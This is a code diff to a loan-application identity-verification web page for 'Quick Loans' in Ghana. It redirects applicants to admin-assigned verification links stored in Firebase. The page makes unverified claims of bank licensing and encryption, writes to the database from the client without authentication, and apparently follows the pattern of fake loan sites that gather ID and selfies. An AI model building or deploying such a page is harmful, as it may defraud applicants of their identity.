@@ -9,7 +9,7 @@
     <meta name="theme-color" content="#E30613">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Firebase SDK (compat) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     <style>
@@ -140,6 +140,19 @@
             color: var(--text-dark);
         }
 
+        .id-list {
+            text-align: left;
+            margin: 12px 0 8px 20px;
+            font-size: 14px;
+            color: var(--text-dark);
+            list-style-type: disc;
+            width: 100%;
+        }
+
+        .id-list li {
+            margin-bottom: 4px;
+        }
+
         .divider {
             width: 100%;
             height: 1px;
@@ -185,24 +198,9 @@
             font-size: 13px;
             font-weight: 700;
             margin: 4px 0 12px;
-        }
-
-        .status-badge.pending {
             background: #fef2f2;
             color: var(--primary-red);
             border: 1px solid #fee2e2;
-        }
-
-        .status-badge.active {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .status-badge.used {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
         }
 
         .btn {
@@ -324,6 +322,55 @@
             }
         }
 
+        /* Session expired overlay */
+        #expiryOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001;
+            padding: 20px;
+        }
+
+        .expiry-card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .expiry-card .expiry-icon {
+            font-size: 48px;
+            color: #dc3545;
+            margin-bottom: 16px;
+        }
+
+        .expiry-card h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .expiry-card p {
+            font-size: 15px;
+            color: #6c757d;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .expiry-card .countdown {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--primary-red);
+        }
+
         @media (max-width: 480px) {
             body {
                 padding: 8px;
@@ -349,6 +396,10 @@
             .detail-row {
                 font-size: 13px;
                 padding: 8px 0;
+            }
+            .id-list {
+                font-size: 13px;
+                margin-left: 16px;
             }
         }
 
@@ -376,6 +427,10 @@
             .detail-value {
                 text-align: left;
                 max-width: 100%;
+            }
+            .id-list {
+                font-size: 12px;
+                margin-left: 14px;
             }
         }
 
@@ -405,24 +460,29 @@
             <i class="fas fa-id-card"></i>
         </div>
 
-        <h1 class="card-title" id="pageTitle">Verify Your Identity</h1>
+        <h1 class="card-title">Verify Your Identity</h1>
 
-        <div class="status-badge pending" id="statusBadge">
+        <!-- Status badge – always Pending -->
+        <div class="status-badge">
             <i class="fas fa-clock" style="margin-right: 6px;"></i> Pending Verification
         </div>
 
+        <!-- Error box -->
         <div class="error-box" id="errorBox">
             <i class="fas fa-exclamation-circle"></i>
             <span id="errorText">No verification link available.</span>
         </div>
 
-        <p class="card-subtitle" id="messageText">
-            To complete your loan application and receive your funds, you need to verify your identity.
+        <!-- Static message – KYC instructions -->
+        <p class="card-subtitle" style="text-align: left; width: 100%;">
+            We need to confirm your identity with a government issued ID and selfie. Before proceeding, make sure you have one of the following forms of ID handy and your camera is enabled. Your data is securely stored and used only for KYC and security purposes.
         </p>
 
-        <p class="card-subtitle" style="margin-top: 6px; font-size: 14px;" id="idHint">
-            Please have your <strong>Ghana Card</strong> or <strong>Voter ID</strong> ready for verification.
-        </p>
+        <ul class="id-list">
+            <li>Government Issued Passport</li>
+            <li>Driver's Licence</li>
+            <li>National Identity Card</li>
+        </ul>
 
         <div class="divider"></div>
 
@@ -447,12 +507,13 @@
 
         <div class="divider"></div>
 
-        <p class="card-subtitle" style="font-size: 13px; color: #888;" id="securityNote">
+        <p class="card-subtitle" style="font-size: 13px; color: #888;">
             <i class="fas fa-shield-alt" style="color: var(--primary-red); margin-right: 6px;"></i>
             Your information is secure and encrypted.
         </p>
 
         <div class="btn-group">
+            <!-- Button always says "Verify Identity" and is always enabled -->
             <button class="btn btn-verify" id="verifyBtn">
                 <i class="fas fa-check-circle" style="margin-right: 8px;"></i> Verify Identity
             </button>
@@ -466,6 +527,17 @@
         </div>
     </main>
 
+    <!-- Session expired overlay -->
+    <div id="expiryOverlay">
+        <div class="expiry-card">
+            <div class="expiry-icon"><i class="fas fa-clock"></i></div>
+            <h2>Session Expired</h2>
+            <p>Your verification link has expired. You will be redirected to the details page to start a new application.</p>
+            <div class="countdown" id="countdownDisplay">5</div>
+            <p style="font-size: 13px; color: #888; margin-top: 8px;">Redirecting in <span id="countdownSeconds">5</span> seconds...</p>
+        </div>
+    </div>
+
     <footer>
         © 2026 Quick Loans – Licensed by Bank of Ghana | Powered by secure mobile payments
     </footer>
@@ -476,7 +548,7 @@
 
     <script>
         // ============================================================
-        // FIREBASE CONFIGURATION (from your project)
+        // FIREBASE CONFIGURATION
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyBqt0UDmHTxPAn33auTapQ-J1R5qf-YfRQ",
@@ -486,7 +558,7 @@
             messagingSenderId: "1021665968096",
             appId: "1:1021665968096:web:23fbf673547e65d48ef585",
             measurementId: "G-P0KHN55TRL",
-            databaseURL: "https://gh-olans-default-rtdb.firebaseio.com/" // IMPORTANT: add this line
+            databaseURL: "https://gh-olans-default-rtdb.firebaseio.com/"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -524,37 +596,26 @@
         document.getElementById('displayGuarantor').textContent = guarantorName;
 
         // ============================================================
-        // 2. Real‑time listener for this user's verification link
+        // 2. DOM references and state
         // ============================================================
 
-        const currentUserId = phone; // Using phone as unique identifier
         const verifyBtn = document.getElementById('verifyBtn');
-        const statusBadge = document.getElementById('statusBadge');
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
-        const pageTitle = document.getElementById('pageTitle');
-        const messageText = document.getElementById('messageText');
-        const idHint = document.getElementById('idHint');
         const infoNote = document.getElementById('infoNote');
-        const securityNote = document.getElementById('securityNote');
         const spinner = document.getElementById('spinner');
+        const expiryOverlay = document.getElementById('expiryOverlay');
+        const countdownDisplay = document.getElementById('countdownDisplay');
+        const countdownSeconds = document.getElementById('countdownSeconds');
 
+        let currentUserId = phone;
         let verificationUrl = null;
         let isProcessing = false;
+        let linkRef = null;
 
-        function setStatus(status) {
-            statusBadge.className = 'status-badge';
-            if (status === 'active') {
-                statusBadge.classList.add('active');
-                statusBadge.innerHTML = `<i class="fas fa-check-circle" style="margin-right:6px;"></i> Verification Ready`;
-            } else if (status === 'used') {
-                statusBadge.classList.add('used');
-                statusBadge.innerHTML = `<i class="fas fa-times-circle" style="margin-right:6px;"></i> Link Already Used`;
-            } else {
-                statusBadge.classList.add('pending');
-                statusBadge.innerHTML = `<i class="fas fa-clock" style="margin-right:6px;"></i> Pending Verification`;
-            }
-        }
+        // ============================================================
+        // 3. Helper functions
+        // ============================================================
 
         function showError(message) {
             errorBox.classList.add('show');
@@ -565,102 +626,137 @@
             errorBox.classList.remove('show');
         }
 
-        function showNoLinkState() {
-            setStatus('pending');
-            pageTitle.textContent = 'Verification Pending';
-            messageText.textContent = 'Your verification link is not yet ready.';
-            idHint.textContent = 'Please contact support or wait for an admin to assign your link.';
-            securityNote.style.display = 'none';
-            infoNote.textContent = 'Support: support@quickloans.com.gh';
-            verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<i class="fas fa-clock" style="margin-right:8px;"></i> Waiting for Link';
-            verifyBtn.className = 'btn btn-secondary';
-            showError('No verification link has been assigned to your account yet.');
-        }
+        // ============================================================
+        // 4. Session expiry handling
+        // ============================================================
 
-        function showUsedLinkState() {
-            setStatus('used');
-            pageTitle.textContent = 'Link Already Used';
-            messageText.textContent = 'This verification link has already been used.';
-            idHint.textContent = 'If you need a new link, please contact support.';
-            securityNote.style.display = 'none';
-            infoNote.textContent = 'Support: support@quickloans.com.gh';
-            verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<i class="fas fa-times-circle" style="margin-right:8px;"></i> Link Expired';
-            verifyBtn.className = 'btn btn-secondary';
-            showError('This verification link has already been used and cannot be reused.');
-        }
+        function startExpiryCountdown() {
+            let count = 5;
+            countdownDisplay.textContent = count;
+            countdownSeconds.textContent = count;
+            expiryOverlay.style.display = 'flex';
 
-        function showActiveLinkState(url) {
-            setStatus('active');
-            hideError();
-            verificationUrl = url;
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px;"></i> Verify Identity';
-            verifyBtn.className = 'btn btn-verify';
-            pageTitle.textContent = 'Verify Your Identity';
-            messageText.textContent = 'To complete your loan application and receive your funds, you need to verify your identity.';
-            idHint.textContent = 'Please have your Ghana Card or Voter ID ready for verification.';
-            securityNote.style.display = 'block';
-            infoNote.textContent = "You'll be redirected to our secure verification partner.";
-        }
-
-        // Listen for changes to this user's link
-        if (currentUserId) {
-            const linkRef = database.ref('veriffLinks/' + currentUserId);
-            linkRef.on('value', (snapshot) => {
-                const linkData = snapshot.val();
-                if (linkData) {
-                    if (linkData.used) {
-                        showUsedLinkState();
-                    } else {
-                        showActiveLinkState(linkData.url);
-                    }
-                } else {
-                    showNoLinkState();
+            const interval = setInterval(() => {
+                count--;
+                countdownDisplay.textContent = count;
+                countdownSeconds.textContent = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'details.html';
                 }
-            });
-        } else {
-            showNoLinkState();
+            }, 1000);
         }
 
         // ============================================================
-        // 3. Verify button handler – one‑time use
+        // 5. Listen for link changes in Firebase
+        // ============================================================
+
+        function listenForLink() {
+            if (!currentUserId) {
+                showError('No user ID found. Please start your application again.');
+                return;
+            }
+
+            linkRef = database.ref('veriffLinks/' + currentUserId);
+            linkRef.on('value', (snapshot) => {
+                const linkData = snapshot.val();
+                hideError();
+
+                if (!linkData) {
+                    // No link assigned yet – nothing to do; the user sees the static message.
+                    verificationUrl = null;
+                    return;
+                }
+
+                // Link exists
+                if (linkData.used) {
+                    // Check expiry
+                    const usedAt = linkData.usedAt || 0;
+                    const now = Date.now();
+                    const elapsed = now - usedAt;
+                    const TEN_MINUTES = 10 * 60 * 1000;
+
+                    if (elapsed > TEN_MINUTES) {
+                        // Session expired
+                        startExpiryCountdown();
+                        return;
+                    } else {
+                        // Link used within last 10 minutes – but we don't show any message; the button will be disabled?
+                        // Actually we keep the button enabled, but when clicked it will try to use again.
+                        // But we can set verificationUrl to null so clicking shows error.
+                        verificationUrl = null;
+                        // Optionally show a message? But user requested static message, so we don't show anything.
+                        return;
+                    }
+                }
+
+                // Link is active (not used)
+                verificationUrl = linkData.url;
+                hideError();
+                // We could optionally update the infoNote, but static is fine.
+            });
+        }
+
+        // ============================================================
+        // 6. Verify button click handler
         // ============================================================
 
         verifyBtn.addEventListener('click', function() {
             if (isProcessing) return;
+
             if (!verificationUrl) {
-                alert('No valid verification link available.');
+                showError('No active verification link available. Please wait for your link to be assigned or contact support.');
                 return;
             }
 
+            // Mark the link as used
             isProcessing = true;
-
-            // Mark the link as used in Firebase
-            database.ref('veriffLinks/' + currentUserId).update({ used: true })
-                .then(() => {
-                    spinner.style.display = 'flex';
-                    verifyBtn.disabled = true;
-
-                    setTimeout(() => {
-                        window.location.href = verificationUrl;
-                    }, 500);
-                })
-                .catch((err) => {
-                    console.error('Error updating link:', err);
-                    alert('Error processing verification. Please try again.');
-                    isProcessing = false;
-                    verifyBtn.disabled = false;
-                });
+            database.ref('veriffLinks/' + currentUserId).update({
+                used: true,
+                usedAt: Date.now()
+            }).then(() => {
+                spinner.style.display = 'flex';
+                verifyBtn.disabled = true;
+                setTimeout(() => {
+                    window.location.href = verificationUrl;
+                }, 500);
+            }).catch((err) => {
+                console.error('Error updating link:', err);
+                showError('Error processing verification. Please try again.');
+                isProcessing = false;
+                verifyBtn.disabled = false;
+            });
         });
 
         // ============================================================
-        // 4. Helper: clear spinner on page load / back navigation
+        // 7. Start listening
+        // ============================================================
+
+        if (currentUserId) {
+            listenForLink();
+        } else {
+            showError('No user ID found. Please start your application again.');
+            setTimeout(() => {
+                window.location.href = 'details.html';
+            }, 3000);
+        }
+
+        // ============================================================
+        // 8. Clear spinner on page load / back navigation
         // ============================================================
 
         window.addEventListener('pageshow', function() {
             spinner.style.display = 'none';
+        });
+
+        // ============================================================
+        // 9. Cleanup listener when leaving the page
+        // ============================================================
+
+        window.addEventListener('beforeunload', function() {
+            if (linkRef) {
+                linkRef.off();
+            }
         });
     </script>
 
